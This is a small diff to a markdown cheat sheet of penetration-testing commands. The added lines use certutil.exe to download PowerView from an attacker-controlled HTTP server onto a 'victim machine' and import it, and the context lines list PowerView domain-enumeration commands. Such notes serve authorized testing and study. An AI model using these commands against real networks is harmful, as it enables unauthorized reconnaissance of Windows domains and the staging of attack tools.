@@ -1,5 +1,9 @@
 ## Enumration and pentest command
 ```bash
+# ===================Transfer Powerview on victim machine ==============#
+certutil.exe -urlcache -f http://10.150.71.41:8000/powerview.ps1 powerview.ps1
+# ================= Import =============================#
+Import-Module .\powerview.ps1
 # ===================== BASIC DOMAIN =====================
 Get-Domain
 Get-DomainSID
